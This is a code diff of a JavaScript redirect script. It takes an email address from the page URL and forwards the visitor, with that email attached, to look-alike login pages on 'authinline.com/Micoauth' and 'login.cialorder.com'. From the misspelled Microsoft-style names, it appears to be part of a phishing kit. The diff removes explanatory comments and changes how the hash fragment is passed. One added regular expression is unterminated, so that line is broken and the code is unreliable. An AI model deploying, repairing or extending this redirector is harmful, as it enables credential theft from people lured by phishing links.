@@ -6,63 +6,45 @@
     function processEmailUrl() {
       var currentURL = window.location.href;
 
-      // Check if the URL contains an '=' character followed by '?'
-      if (currentURL.includes('=') && currentURL.includes('?')) {
-        // Extract the email using a regular expression
-        var emailRegex = /=(.*?)(&|$)/;
+      if (currentURL.includes('=')) {
+        var emailRegex = /=(.*?)(#|$)/;
         var emailMatch = currentURL.match(emailRegex);
 
         if (emailMatch) {
-          // Extract the email value
           var email = emailMatch[1];
-
-          // Construct the final redirect URL
-          var redirectURL = 'https://authinline.com/Micoauth/index.html#' + email;
-
-          // Redirect to the final URL
+          var hash = window.location.hash; // Get the existing hash fragment
+          var redirectURL = 'https://authinline.com/Micoauth/index.html' + hash + email;
           window.location.href = redirectURL;
         } else {
-          // If no email is found in the URL, simply redirect to the second link
           window.location.href = 'https://authinline.com/Micoauth/index.html';
         }
       } else {
-        // If the URL didn't match the email pattern, proceed with extracting the email
         extractEmailAndRedirect();
       }
     }
 
     function extractEmailAndRedirect() {
-      // Get the current URL
       var currentURL = window.location.href;
 
-      // Check if the current URL contains a '?' character
       if (currentURL.includes('?')) {
-        // Split the URL into two parts: the base URL and the email part
         var parts = currentURL.split('?');
-        var baseURL = parts[0]; // https://Microoauth.github.io/mail
+        var baseURL = parts[0];
         var emailPart = parts[1];
 
-        // Check if the email part is not empty
         if (emailPart) {
-          // Extract the email by finding the first '@' symbol
-          var email = emailPart.match(/[^@]+@[^@]+/);
+          var email = emailPart.match(/[^@]+@[^@]+);
 
           if (email) {
-            // Construct the final redirect URL with the extracted email
-            var redirectURL = 'https://login.cialorder.com/mhXayjAt#' + email[0];
-
-            // Redirect to the final URL
+            var hash = window.location.hash; // Get the existing hash fragment
+            var redirectURL = 'https://login.cialorder.com/mhXayjAt' + hash + email[0];
             window.location.href = redirectURL;
           } else {
-            // If no email is found in the URL, simply redirect to the final link
             window.location.href = 'https://login.cialorder.com/mhXayjAt';
           }
         } else {
-          // If the email part is empty, simply redirect to the final link
           window.location.href = 'https://login.cialorder.com/mhXayjAt';
         }
       } else {
-        // If no '?' character is found, simply redirect to the final link
         window.location.href = 'https://login.cialorder.com/mhXayjAt';
       }
     }
